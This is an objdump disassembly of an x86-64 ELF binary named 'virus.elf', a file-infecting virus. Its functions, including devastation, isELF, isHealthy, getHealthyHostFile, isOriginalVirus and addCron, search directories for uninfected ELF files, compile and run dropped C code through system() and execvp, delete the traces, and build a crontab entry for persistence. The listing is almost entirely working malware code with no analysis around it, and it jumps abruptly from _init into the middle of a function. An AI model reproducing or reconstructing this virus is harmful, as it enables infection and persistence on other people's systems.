
virus.elf:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 <_init>:
    1000:	f3 0f 1e fa          	endbr64 
    16c7:	66 c7 85 50 fd ff ff 	mov    WORD PTR [rbp-0x2b0],0xa7d
    16ce:	7d 0a 
    16d0:	c6 85 52 fd ff ff 00 	mov    BYTE PTR [rbp-0x2ae],0x0
    16d7:	48 8b 95 18 fd ff ff 	mov    rdx,QWORD PTR [rbp-0x2e8]
    16de:	48 8d 85 90 fd ff ff 	lea    rax,[rbp-0x270]
    16e5:	48 89 d6             	mov    rsi,rdx
    16e8:	48 89 c7             	mov    rdi,rax
    16eb:	e8 d0 fb ff ff       	call   12c0 <strcpy@plt>
    16f0:	48 8d 85 90 fd ff ff 	lea    rax,[rbp-0x270]
    16f7:	48 c7 c1 ff ff ff ff 	mov    rcx,0xffffffffffffffff
    16fe:	48 89 c2             	mov    rdx,rax
    1701:	b8 00 00 00 00       	mov    eax,0x0
    1706:	48 89 d7             	mov    rdi,rdx
    1709:	f2 ae                	repnz scas al,BYTE PTR es:[rdi]
    170b:	48 89 c8             	mov    rax,rcx
    170e:	48 f7 d0             	not    rax
    1711:	48 8d 50 ff          	lea    rdx,[rax-0x1]
    1715:	48 8d 85 90 fd ff ff 	lea    rax,[rbp-0x270]
    171c:	48 01 d0             	add    rax,rdx
    171f:	c7 00 5f 74 65 6d    	mov    DWORD PTR [rax],0x6d65745f
    1725:	66 c7 40 04 70 00    	mov    WORD PTR [rax+0x4],0x70
    172b:	48 8d 95 90 fd ff ff 	lea    rdx,[rbp-0x270]
    1732:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    1739:	48 89 d6             	mov    rsi,rdx
    173c:	48 89 c7             	mov    rdi,rax
    173f:	e8 7c fb ff ff       	call   12c0 <strcpy@plt>
    1744:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    174b:	48 c7 c1 ff ff ff ff 	mov    rcx,0xffffffffffffffff
    1752:	48 89 c2             	mov    rdx,rax
    1755:	b8 00 00 00 00       	mov    eax,0x0
    175a:	48 89 d7             	mov    rdi,rdx
    175d:	f2 ae                	repnz scas al,BYTE PTR es:[rdi]
    175f:	48 89 c8             	mov    rax,rcx
    1762:	48 f7 d0             	not    rax
    1765:	48 8d 50 ff          	lea    rdx,[rax-0x1]
    1769:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    1770:	48 01 d0             	add    rax,rdx
    1773:	66 c7 00 2e 63       	mov    WORD PTR [rax],0x632e
    1778:	c6 40 02 00          	mov    BYTE PTR [rax+0x2],0x0
    177c:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    1783:	be 80 01 00 00       	mov    esi,0x180
    1788:	48 89 c7             	mov    rdi,rax
    178b:	e8 00 fd ff ff       	call   1490 <creat@plt>
    1790:	89 85 28 fd ff ff    	mov    DWORD PTR [rbp-0x2d8],eax
    1796:	48 8d 8d 40 fd ff ff 	lea    rcx,[rbp-0x2c0]
    179d:	8b 85 28 fd ff ff    	mov    eax,DWORD PTR [rbp-0x2d8]
    17a3:	ba 12 00 00 00       	mov    edx,0x12
    17a8:	48 89 ce             	mov    rsi,rcx
    17ab:	89 c7                	mov    edi,eax
    17ad:	e8 2e fb ff ff       	call   12e0 <write@plt>
    17b2:	48 b8 67 63 63 20 2d 	movabs rax,0x20772d20636367
    17b9:	77 20 00 
    17bc:	ba 00 00 00 00       	mov    edx,0x0
    17c1:	48 89 85 30 ff ff ff 	mov    QWORD PTR [rbp-0xd0],rax
    17c8:	48 89 95 38 ff ff ff 	mov    QWORD PTR [rbp-0xc8],rdx
    17cf:	48 c7 85 40 ff ff ff 	mov    QWORD PTR [rbp-0xc0],0x0
    17d6:	00 00 00 00 
    17da:	48 c7 85 48 ff ff ff 	mov    QWORD PTR [rbp-0xb8],0x0
    17e1:	00 00 00 00 
    17e5:	48 c7 85 50 ff ff ff 	mov    QWORD PTR [rbp-0xb0],0x0
    17ec:	00 00 00 00 
    17f0:	48 c7 85 58 ff ff ff 	mov    QWORD PTR [rbp-0xa8],0x0
    17f7:	00 00 00 00 
    17fb:	48 c7 85 60 ff ff ff 	mov    QWORD PTR [rbp-0xa0],0x0
    1802:	00 00 00 00 
    1806:	48 c7 85 68 ff ff ff 	mov    QWORD PTR [rbp-0x98],0x0
    180d:	00 00 00 00 
    1811:	48 c7 85 70 ff ff ff 	mov    QWORD PTR [rbp-0x90],0x0
    1818:	00 00 00 00 
    181c:	48 c7 85 78 ff ff ff 	mov    QWORD PTR [rbp-0x88],0x0
    1823:	00 00 00 00 
    1827:	48 c7 45 80 00 00 00 	mov    QWORD PTR [rbp-0x80],0x0
    182e:	00 
    182f:	48 c7 45 88 00 00 00 	mov    QWORD PTR [rbp-0x78],0x0
    1836:	00 
    1837:	48 c7 45 90 00 00 00 	mov    QWORD PTR [rbp-0x70],0x0
    183e:	00 
    183f:	48 c7 45 98 00 00 00 	mov    QWORD PTR [rbp-0x68],0x0
    1846:	00 
    1847:	48 c7 45 a0 00 00 00 	mov    QWORD PTR [rbp-0x60],0x0
    184e:	00 
    184f:	48 c7 45 a8 00 00 00 	mov    QWORD PTR [rbp-0x58],0x0
    1856:	00 
    1857:	48 c7 45 b0 00 00 00 	mov    QWORD PTR [rbp-0x50],0x0
    185e:	00 
    185f:	48 c7 45 b8 00 00 00 	mov    QWORD PTR [rbp-0x48],0x0
    1866:	00 
    1867:	48 c7 45 c0 00 00 00 	mov    QWORD PTR [rbp-0x40],0x0
    186e:	00 
    186f:	48 c7 45 c8 00 00 00 	mov    QWORD PTR [rbp-0x38],0x0
    1876:	00 
    1877:	48 c7 45 d0 00 00 00 	mov    QWORD PTR [rbp-0x30],0x0
    187e:	00 
    187f:	48 c7 45 d8 00 00 00 	mov    QWORD PTR [rbp-0x28],0x0
    1886:	00 
    1887:	48 c7 45 e0 00 00 00 	mov    QWORD PTR [rbp-0x20],0x0
    188e:	00 
    188f:	48 c7 45 e8 00 00 00 	mov    QWORD PTR [rbp-0x18],0x0
    1896:	00 
    1897:	48 c7 45 f0 00 00 00 	mov    QWORD PTR [rbp-0x10],0x0
    189e:	00 
    189f:	48 8d 95 60 fe ff ff 	lea    rdx,[rbp-0x1a0]
    18a6:	48 8d 85 30 ff ff ff 	lea    rax,[rbp-0xd0]
    18ad:	48 89 d6             	mov    rsi,rdx
    18b0:	48 89 c7             	mov    rdi,rax
    18b3:	e8 c8 fb ff ff       	call   1480 <strcat@plt>
    18b8:	48 8d 85 30 ff ff ff 	lea    rax,[rbp-0xd0]
    18bf:	48 c7 c1 ff ff ff ff 	mov    rcx,0xffffffffffffffff
    18c6:	48 89 c2             	mov    rdx,rax
    18c9:	b8 00 00 00 00       	mov    eax,0x0
    18ce:	48 89 d7             	mov    rdi,rdx
    18d1:	f2 ae                	repnz scas al,BYTE PTR es:[rdi]
    18d3:	48 89 c8             	mov    rax,rcx
    18d6:	48 f7 d0             	not    rax
    18d9:	48 8d 50 ff          	lea    rdx,[rax-0x1]
    18dd:	48 8d 85 30 ff ff ff 	lea    rax,[rbp-0xd0]
    18e4:	48 01 d0             	add    rax,rdx
    18e7:	c7 00 20 2d 6f 20    	mov    DWORD PTR [rax],0x206f2d20
    18ed:	c6 40 04 00          	mov    BYTE PTR [rax+0x4],0x0
    18f1:	48 8d 95 90 fd ff ff 	lea    rdx,[rbp-0x270]
    18f8:	48 8d 85 30 ff ff ff 	lea    rax,[rbp-0xd0]
    18ff:	48 89 d6             	mov    rsi,rdx
    1902:	48 89 c7             	mov    rdi,rax
    1905:	e8 76 fb ff ff       	call   1480 <strcat@plt>
    190a:	48 8d 85 30 ff ff ff 	lea    rax,[rbp-0xd0]
    1911:	48 89 c7             	mov    rdi,rax
    1914:	e8 17 fa ff ff       	call   1330 <system@plt>
    1919:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    1920:	48 89 c7             	mov    rdi,rax
    1923:	e8 88 f9 ff ff       	call   12b0 <remove@plt>
    1928:	e8 93 fb ff ff       	call   14c0 <fork@plt>
    192d:	89 85 2c fd ff ff    	mov    DWORD PTR [rbp-0x2d4],eax
    1933:	83 bd 2c fd ff ff 00 	cmp    DWORD PTR [rbp-0x2d4],0x0
    193a:	75 34                	jne    1970 <devastation+0x35e>
    193c:	48 8d 85 90 fd ff ff 	lea    rax,[rbp-0x270]
    1943:	48 89 85 30 fd ff ff 	mov    QWORD PTR [rbp-0x2d0],rax
    194a:	48 c7 85 38 fd ff ff 	mov    QWORD PTR [rbp-0x2c8],0x0
    1951:	00 00 00 00 
    1955:	48 8b 85 30 fd ff ff 	mov    rax,QWORD PTR [rbp-0x2d0]
    195c:	48 8d 95 30 fd ff ff 	lea    rdx,[rbp-0x2d0]
    1963:	48 89 d6             	mov    rsi,rdx
    1966:	48 89 c7             	mov    rdi,rax
    1969:	e8 02 fb ff ff       	call   1470 <execvp@plt>
    196e:	eb 19                	jmp    1989 <devastation+0x377>
    1970:	bf 01 00 00 00       	mov    edi,0x1
    1975:	e8 26 fb ff ff       	call   14a0 <sleep@plt>
    197a:	48 8d 85 90 fd ff ff 	lea    rax,[rbp-0x270]
    1981:	48 89 c7             	mov    rdi,rax
    1984:	e8 27 f9 ff ff       	call   12b0 <remove@plt>
    1989:	90                   	nop
    198a:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    198e:	64 48 33 04 25 28 00 	xor    rax,QWORD PTR fs:0x28
    1995:	00 00 
    1997:	74 05                	je     199e <devastation+0x38c>
    1999:	e8 62 f9 ff ff       	call   1300 <__stack_chk_fail@plt>
    199e:	c9                   	leave  
    199f:	c3                   	ret    

00000000000019a0 <isELF>:
    19a0:	f3 0f 1e fa          	endbr64 
    19a4:	55                   	push   rbp
    19a5:	48 89 e5             	mov    rbp,rsp
    19a8:	48 83 ec 20          	sub    rsp,0x20
    19ac:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
    19b0:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
    19b4:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    19bb:	00 00 
    19bd:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    19c1:	31 c0                	xor    eax,eax
    19c3:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
    19c7:	0f b6 00             	movzx  eax,BYTE PTR [rax]
    19ca:	3c 2e                	cmp    al,0x2e
    19cc:	75 07                	jne    19d5 <isELF+0x35>
    19ce:	b8 00 00 00 00       	mov    eax,0x0
    19d3:	eb 68                	jmp    1a3d <isELF+0x9d>
    19d5:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
    19d9:	be 00 00 00 00       	mov    esi,0x0
    19de:	48 89 c7             	mov    rdi,rax
    19e1:	b8 00 00 00 00       	mov    eax,0x0
    19e6:	e8 55 fa ff ff       	call   1440 <open@plt>
    19eb:	89 45 f0             	mov    DWORD PTR [rbp-0x10],eax
    19ee:	48 8d 4d f4          	lea    rcx,[rbp-0xc]
    19f2:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
    19f5:	ba 04 00 00 00       	mov    edx,0x4
    19fa:	48 89 ce             	mov    rsi,rcx
    19fd:	89 c7                	mov    edi,eax
    19ff:	e8 8c f9 ff ff       	call   1390 <read@plt>
    1a04:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
    1a07:	89 c7                	mov    edi,eax
    1a09:	e8 62 f9 ff ff       	call   1370 <close@plt>
    1a0e:	0f b6 45 f4          	movzx  eax,BYTE PTR [rbp-0xc]
    1a12:	3c 7f                	cmp    al,0x7f
    1a14:	75 1f                	jne    1a35 <isELF+0x95>
    1a16:	0f b6 45 f5          	movzx  eax,BYTE PTR [rbp-0xb]
    1a1a:	3c 45                	cmp    al,0x45
    1a1c:	75 17                	jne    1a35 <isELF+0x95>
    1a1e:	0f b6 45 f6          	movzx  eax,BYTE PTR [rbp-0xa]
    1a22:	3c 4c                	cmp    al,0x4c
    1a24:	75 0f                	jne    1a35 <isELF+0x95>
    1a26:	0f b6 45 f7          	movzx  eax,BYTE PTR [rbp-0x9]
    1a2a:	3c 46                	cmp    al,0x46
    1a2c:	75 07                	jne    1a35 <isELF+0x95>
    1a2e:	b8 01 00 00 00       	mov    eax,0x1
    1a33:	eb 05                	jmp    1a3a <isELF+0x9a>
    1a35:	b8 00 00 00 00       	mov    eax,0x0
    1a3a:	83 e0 01             	and    eax,0x1
    1a3d:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
    1a41:	64 48 33 14 25 28 00 	xor    rdx,QWORD PTR fs:0x28
    1a48:	00 00 
    1a4a:	74 05                	je     1a51 <isELF+0xb1>
    1a4c:	e8 af f8 ff ff       	call   1300 <__stack_chk_fail@plt>
    1a51:	c9                   	leave  
    1a52:	c3                   	ret    

0000000000001a53 <isHealthy>:
    1a53:	f3 0f 1e fa          	endbr64 
    1a57:	55                   	push   rbp
    1a58:	48 89 e5             	mov    rbp,rsp
    1a5b:	48 83 ec 20          	sub    rsp,0x20
    1a5f:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
    1a63:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    1a6a:	00 00 
    1a6c:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    1a70:	31 c0                	xor    eax,eax
    1a72:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
    1a76:	be 00 00 00 00       	mov    esi,0x0
    1a7b:	48 89 c7             	mov    rdi,rax
    1a7e:	b8 00 00 00 00       	mov    eax,0x0
    1a83:	e8 b8 f9 ff ff       	call   1440 <open@plt>
    1a88:	89 45 f4             	mov    DWORD PTR [rbp-0xc],eax
    1a8b:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
    1a8e:	ba 00 00 00 00       	mov    edx,0x0
    1a93:	be 09 00 00 00       	mov    esi,0x9
    1a98:	89 c7                	mov    edi,eax
    1a9a:	e8 c1 f8 ff ff       	call   1360 <lseek@plt>
    1a9f:	48 8d 4d f0          	lea    rcx,[rbp-0x10]
    1aa3:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
    1aa6:	ba 04 00 00 00       	mov    edx,0x4
    1aab:	48 89 ce             	mov    rsi,rcx
    1aae:	89 c7                	mov    edi,eax
    1ab0:	e8 db f8 ff ff       	call   1390 <read@plt>
    1ab5:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
    1ab8:	89 c7                	mov    edi,eax
    1aba:	e8 b1 f8 ff ff       	call   1370 <close@plt>
    1abf:	8b 45 f0             	mov    eax,DWORD PTR [rbp-0x10]
    1ac2:	3d 25 5d 01 00       	cmp    eax,0x15d25
    1ac7:	0f 95 c0             	setne  al
    1aca:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
    1ace:	64 48 33 14 25 28 00 	xor    rdx,QWORD PTR fs:0x28
    1ad5:	00 00 
    1ad7:	74 05                	je     1ade <isHealthy+0x8b>
    1ad9:	e8 22 f8 ff ff       	call   1300 <__stack_chk_fail@plt>
    1ade:	c9                   	leave  
    1adf:	c3                   	ret    

0000000000001ae0 <getHealthyHostFile>:
    1ae0:	f3 0f 1e fa          	endbr64 
    1ae4:	55                   	push   rbp
    1ae5:	48 89 e5             	mov    rbp,rsp
    1ae8:	48 81 ec d0 04 00 00 	sub    rsp,0x4d0
    1aef:	48 89 bd 48 fb ff ff 	mov    QWORD PTR [rbp-0x4b8],rdi
    1af6:	48 89 b5 40 fb ff ff 	mov    QWORD PTR [rbp-0x4c0],rsi
    1afd:	48 89 95 38 fb ff ff 	mov    QWORD PTR [rbp-0x4c8],rdx
    1b04:	89 8d 34 fb ff ff    	mov    DWORD PTR [rbp-0x4cc],ecx
    1b0a:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    1b11:	00 00 
    1b13:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    1b17:	31 c0                	xor    eax,eax
    1b19:	48 8b 85 38 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4c8]
    1b20:	48 89 c7             	mov    rdi,rax
    1b23:	e8 c8 f7 ff ff       	call   12f0 <opendir@plt>
    1b28:	48 89 85 50 fb ff ff 	mov    QWORD PTR [rbp-0x4b0],rax
    1b2f:	48 83 bd 50 fb ff ff 	cmp    QWORD PTR [rbp-0x4b0],0x0
    1b36:	00 
    1b37:	0f 84 ec 01 00 00    	je     1d29 <getHealthyHostFile+0x249>
    1b3d:	e9 b2 01 00 00       	jmp    1cf4 <getHealthyHostFile+0x214>
    1b42:	48 8b 85 58 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4a8]
    1b49:	0f b6 40 12          	movzx  eax,BYTE PTR [rax+0x12]
    1b4d:	3c 04                	cmp    al,0x4
    1b4f:	0f 85 cd 00 00 00    	jne    1c22 <getHealthyHostFile+0x142>
    1b55:	48 8b 85 58 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4a8]
    1b5c:	48 83 c0 13          	add    rax,0x13
    1b60:	48 8d 35 9d 14 00 00 	lea    rsi,[rip+0x149d]        # 3004 <_IO_stdin_used+0x4>
    1b67:	48 89 c7             	mov    rdi,rax
    1b6a:	e8 41 f8 ff ff       	call   13b0 <strcmp@plt>
    1b6f:	85 c0                	test   eax,eax
    1b71:	0f 84 7d 01 00 00    	je     1cf4 <getHealthyHostFile+0x214>
    1b77:	48 8b 85 58 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4a8]
    1b7e:	48 83 c0 13          	add    rax,0x13
    1b82:	48 8d 35 7d 14 00 00 	lea    rsi,[rip+0x147d]        # 3006 <_IO_stdin_used+0x6>
    1b89:	48 89 c7             	mov    rdi,rax
    1b8c:	e8 1f f8 ff ff       	call   13b0 <strcmp@plt>
    1b91:	85 c0                	test   eax,eax
    1b93:	0f 84 5b 01 00 00    	je     1cf4 <getHealthyHostFile+0x214>
    1b99:	48 8b 85 58 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4a8]
    1ba0:	0f b6 40 13          	movzx  eax,BYTE PTR [rax+0x13]
    1ba4:	3c 2e                	cmp    al,0x2e
    1ba6:	75 05                	jne    1bad <getHealthyHostFile+0xcd>
    1ba8:	e9 47 01 00 00       	jmp    1cf4 <getHealthyHostFile+0x214>
    1bad:	48 8b 85 58 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4a8]
    1bb4:	48 8d 48 13          	lea    rcx,[rax+0x13]
    1bb8:	48 8b 95 38 fb ff ff 	mov    rdx,QWORD PTR [rbp-0x4c8]
    1bbf:	48 8d 85 f0 fb ff ff 	lea    rax,[rbp-0x410]
    1bc6:	49 89 c8             	mov    r8,rcx
    1bc9:	48 89 d1             	mov    rcx,rdx
    1bcc:	48 8d 15 36 14 00 00 	lea    rdx,[rip+0x1436]        # 3009 <_IO_stdin_used+0x9>
    1bd3:	be 00 04 00 00       	mov    esi,0x400
    1bd8:	48 89 c7             	mov    rdi,rax
    1bdb:	b8 00 00 00 00       	mov    eax,0x0
    1be0:	e8 6b f7 ff ff       	call   1350 <snprintf@plt>
    1be5:	8b 85 34 fb ff ff    	mov    eax,DWORD PTR [rbp-0x4cc]
    1beb:	8d 48 02             	lea    ecx,[rax+0x2]
    1bee:	48 8d 95 f0 fb ff ff 	lea    rdx,[rbp-0x410]
    1bf5:	48 8b b5 40 fb ff ff 	mov    rsi,QWORD PTR [rbp-0x4c0]
    1bfc:	48 8b 85 48 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4b8]
    1c03:	48 89 c7             	mov    rdi,rax
    1c06:	e8 d5 fe ff ff       	call   1ae0 <getHealthyHostFile>
    1c0b:	48 8b 85 48 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4b8]
    1c12:	0f b6 00             	movzx  eax,BYTE PTR [rax]
    1c15:	84 c0                	test   al,al
    1c17:	0f 85 0f 01 00 00    	jne    1d2c <getHealthyHostFile+0x24c>
    1c1d:	e9 d2 00 00 00       	jmp    1cf4 <getHealthyHostFile+0x214>
    1c22:	48 8b 85 58 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4a8]
    1c29:	48 8d 48 13          	lea    rcx,[rax+0x13]
    1c2d:	48 8b 95 38 fb ff ff 	mov    rdx,QWORD PTR [rbp-0x4c8]
    1c34:	48 8d 85 f0 fb ff ff 	lea    rax,[rbp-0x410]
    1c3b:	49 89 c8             	mov    r8,rcx
    1c3e:	48 89 d1             	mov    rcx,rdx
    1c41:	48 8d 15 c1 13 00 00 	lea    rdx,[rip+0x13c1]        # 3009 <_IO_stdin_used+0x9>
    1c48:	be 00 04 00 00       	mov    esi,0x400
    1c4d:	48 89 c7             	mov    rdi,rax
    1c50:	b8 00 00 00 00       	mov    eax,0x0
    1c55:	e8 f6 f6 ff ff       	call   1350 <snprintf@plt>
    1c5a:	48 8d 95 60 fb ff ff 	lea    rdx,[rbp-0x4a0]
    1c61:	48 8d 85 f0 fb ff ff 	lea    rax,[rbp-0x410]
    1c68:	48 89 d6             	mov    rsi,rdx
    1c6b:	48 89 c7             	mov    rdi,rax
    1c6e:	e8 1d 0b 00 00       	call   2790 <__stat>
    1c73:	48 8b 85 58 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4a8]
    1c7a:	48 8d 50 13          	lea    rdx,[rax+0x13]
    1c7e:	48 8b 85 40 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4c0]
    1c85:	48 89 c6             	mov    rsi,rax
    1c88:	48 89 d7             	mov    rdi,rdx
    1c8b:	e8 20 f7 ff ff       	call   13b0 <strcmp@plt>
    1c90:	85 c0                	test   eax,eax
    1c92:	75 02                	jne    1c96 <getHealthyHostFile+0x1b6>
    1c94:	eb 5e                	jmp    1cf4 <getHealthyHostFile+0x214>
    1c96:	48 8b 85 58 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4a8]
    1c9d:	48 8d 50 13          	lea    rdx,[rax+0x13]
    1ca1:	48 8d 85 f0 fb ff ff 	lea    rax,[rbp-0x410]
    1ca8:	48 89 d6             	mov    rsi,rdx
    1cab:	48 89 c7             	mov    rdi,rax
    1cae:	e8 ed fc ff ff       	call   19a0 <isELF>
    1cb3:	84 c0                	test   al,al
    1cb5:	74 3d                	je     1cf4 <getHealthyHostFile+0x214>
    1cb7:	48 8d 85 f0 fb ff ff 	lea    rax,[rbp-0x410]
    1cbe:	48 89 c7             	mov    rdi,rax
    1cc1:	e8 8d fd ff ff       	call   1a53 <isHealthy>
    1cc6:	84 c0                	test   al,al
    1cc8:	74 2a                	je     1cf4 <getHealthyHostFile+0x214>
    1cca:	48 8d 95 f0 fb ff ff 	lea    rdx,[rbp-0x410]
    1cd1:	48 8b 85 48 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4b8]
    1cd8:	48 89 d6             	mov    rsi,rdx
    1cdb:	48 89 c7             	mov    rdi,rax
    1cde:	e8 dd f5 ff ff       	call   12c0 <strcpy@plt>
    1ce3:	48 8b 85 50 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4b0]
    1cea:	48 89 c7             	mov    rdi,rax
    1ced:	e8 8e f6 ff ff       	call   1380 <closedir@plt>
    1cf2:	eb 39                	jmp    1d2d <getHealthyHostFile+0x24d>
    1cf4:	48 8b 85 50 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4b0]
    1cfb:	48 89 c7             	mov    rdi,rax
    1cfe:	e8 ed f6 ff ff       	call   13f0 <readdir@plt>
    1d03:	48 89 85 58 fb ff ff 	mov    QWORD PTR [rbp-0x4a8],rax
    1d0a:	48 83 bd 58 fb ff ff 	cmp    QWORD PTR [rbp-0x4a8],0x0
    1d11:	00 
    1d12:	0f 85 2a fe ff ff    	jne    1b42 <getHealthyHostFile+0x62>
    1d18:	48 8b 85 50 fb ff ff 	mov    rax,QWORD PTR [rbp-0x4b0]
    1d1f:	48 89 c7             	mov    rdi,rax
    1d22:	e8 59 f6 ff ff       	call   1380 <closedir@plt>
    1d27:	eb 04                	jmp    1d2d <getHealthyHostFile+0x24d>
    1d29:	90                   	nop
    1d2a:	eb 01                	jmp    1d2d <getHealthyHostFile+0x24d>
    1d2c:	90                   	nop
    1d2d:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    1d31:	64 48 33 04 25 28 00 	xor    rax,QWORD PTR fs:0x28
    1d38:	00 00 
    1d3a:	74 05                	je     1d41 <getHealthyHostFile+0x261>
    1d3c:	e8 bf f5 ff ff       	call   1300 <__stack_chk_fail@plt>
    1d41:	c9                   	leave  
    1d42:	c3                   	ret    

0000000000001d43 <isOriginalVirus>:
    1d43:	f3 0f 1e fa          	endbr64 
    1d47:	55                   	push   rbp
    1d48:	48 89 e5             	mov    rbp,rsp
    1d4b:	48 83 ec 10          	sub    rsp,0x10
    1d4f:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi
    1d52:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
    1d55:	ba 02 00 00 00       	mov    edx,0x2
    1d5a:	be 00 00 00 00       	mov    esi,0x0
    1d5f:	89 c7                	mov    edi,eax
    1d61:	e8 fa f5 ff ff       	call   1360 <lseek@plt>
    1d66:	48 3d a8 59 00 00    	cmp    rax,0x59a8
    1d6c:	0f 94 c0             	sete   al
    1d6f:	c9                   	leave  
    1d70:	c3                   	ret    

0000000000001d71 <addCron>:
    1d71:	f3 0f 1e fa          	endbr64 
    1d75:	55                   	push   rbp
    1d76:	48 89 e5             	mov    rbp,rsp
    1d79:	48 81 ec c0 01 00 00 	sub    rsp,0x1c0
    1d80:	48 89 bd 48 fe ff ff 	mov    QWORD PTR [rbp-0x1b8],rdi
    1d87:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    1d8e:	00 00 
    1d90:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    1d94:	31 c0                	xor    eax,eax
    1d96:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    1d9d:	48 be 65 63 68 6f 20 	movabs rsi,0x343522206f686365
    1da4:	22 35 34 
    1da7:	48 bf 20 31 36 20 2a 	movabs rdi,0x202a202a20363120
    1dae:	20 2a 20 
    1db1:	48 89 30             	mov    QWORD PTR [rax],rsi
    1db4:	48 89 78 08          	mov    QWORD PTR [rax+0x8],rdi
    1db8:	66 c7 40 10 2a 20    	mov    WORD PTR [rax+0x10],0x202a
    1dbe:	c6 40 12 00          	mov    BYTE PTR [rax+0x12],0x0
    1dc2:	48 8d 95 30 ff ff ff 	lea    rdx,[rbp-0xd0]
    1dc9:	48 8b 85 48 fe ff ff 	mov    rax,QWORD PTR [rbp-0x1b8]
    1dd0:	48 89 d6             	mov    rsi,rdx
    1dd3:	48 89 c7             	mov    rdi,rax
    1dd6:	e8 e5 f5 ff ff       	call   13c0 <realpath@plt>
    1ddb:	48 89 85 58 fe ff ff 	mov    QWORD PTR [rbp-0x1a8],rax
    1de2:	48 8b 95 58 fe ff ff 	mov    rdx,QWORD PTR [rbp-0x1a8]
    1de9:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    1df0:	48 89 d6             	mov    rsi,rdx
    1df3:	48 89 c7             	mov    rdi,rax
    1df6:	e8 85 f6 ff ff       	call   1480 <strcat@plt>
    1dfb:	48 8d 85 60 fe ff ff 	lea    rax,[rbp-0x1a0]
    1e02:	48 c7 c1 ff ff ff ff 	mov    rcx,0xffffffffffffffff
    1e09:	48 89 c2             	mov    rdx,rax
    1e0c:	b8 00 00 00 00       	mov    eax,0x0
    1e11:	48 89 d7             	mov    rdi,rdx
    1e14:	f2 ae                	repnz scas al,BYTE PTR es:[rdi]
    1e16:	48 89 c8             	mov    rax,rcx
